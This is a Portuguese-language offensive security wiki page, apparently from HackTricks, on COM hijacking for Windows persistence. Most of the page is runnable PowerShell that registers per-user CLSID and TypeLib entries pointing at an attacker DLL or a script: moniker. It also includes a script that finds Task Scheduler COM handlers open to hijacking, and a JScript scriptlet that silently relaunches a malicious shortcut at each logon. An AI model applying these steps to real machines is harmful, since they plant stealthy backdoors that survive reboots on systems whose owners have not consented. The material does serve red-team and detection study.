# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Procurando componentes COM inexistentes

Como os valores de HKCU podem ser modificados pelos usuários, **COM Hijacking** pode ser usado como um **mecanismo persistente**. Usando `procmon` é fácil encontrar chaves de registro COM pesquisadas que não existem e que um atacante poderia criar para persistir. Filtros:

- **RegOpenKey** operações.
- onde o _Result_ é **NAME NOT FOUND**.
- e o _Path_ termina com **InprocServer32**.

Uma vez decidido por qual COM inexistente se passar, execute os seguintes comandos. _Tenha cuidado se decidir se passar por um COM que é carregado a cada poucos segundos, pois isso pode ser excessivo._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Componentes COM do Task Scheduler sequestráveis

Windows Tasks usam Custom Triggers para chamar COM objects e, como são executadas através do Task Scheduler, é mais fácil prever quando serão acionadas.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Analisando a saída, você pode selecionar uma que será executada, por exemplo, **toda vez que um usuário fizer login**.

Agora, ao procurar o CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** em **HKEY\CLASSES\ROOT\CLSID** e em HKLM e HKCU, normalmente você vai encontrar que o valor não existe em HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Então, você pode simplesmente criar a entrada HKCU e toda vez que o usuário fizer login, seu backdoor será executado.

---

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) definem interfaces COM e são carregadas via `LoadTypeLib()`. Quando um servidor COM é instanciado, o OS também pode carregar o TypeLib associado consultando chaves de registro sob `HKCR\TypeLib\{LIBID}`. Se o caminho do TypeLib for substituído por um **moniker**, por exemplo `script:C:\...\evil.sct`, o Windows executará o scriptlet quando o TypeLib for resolvido — resultando em uma persistência furtiva que dispara quando componentes comuns são acessados.

Isso foi observado contra o Microsoft Web Browser control (frequentemente carregado pelo Internet Explorer, apps que incorporam o WebBrowser, e até mesmo `explorer.exe`).

### Passos (PowerShell)

1) Identifique o TypeLib (LIBID) usado por um CLSID de alta frequência. Exemplo de CLSID frequentemente abusado por cadeias de malware: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Aponte o per-user TypeLib path para um scriptlet local usando o moniker `script:` (no admin rights required):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Coloque um `.sct` JScript mínimo que reexecute seu payload principal (por exemplo, um `.lnk` usado pela cadeia inicial):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Acionamento – abrir o IE, um aplicativo que incorpore o WebBrowser control, ou mesmo atividade rotineira do Explorer carregará o TypeLib e executará o scriptlet, rearmando sua cadeia no logon/reboot.

Limpeza
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Notas
- Você pode aplicar a mesma lógica a outros componentes COM de alta frequência; sempre resolva o real `LIBID` a partir de `HKCR\CLSID\{CLSID}\TypeLib` primeiro.
- Em sistemas 64-bit, você também pode preencher a subchave `win64` para consumidores 64-bit.

## Referências

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)

{{#include ../../banners/hacktricks-training.md}}
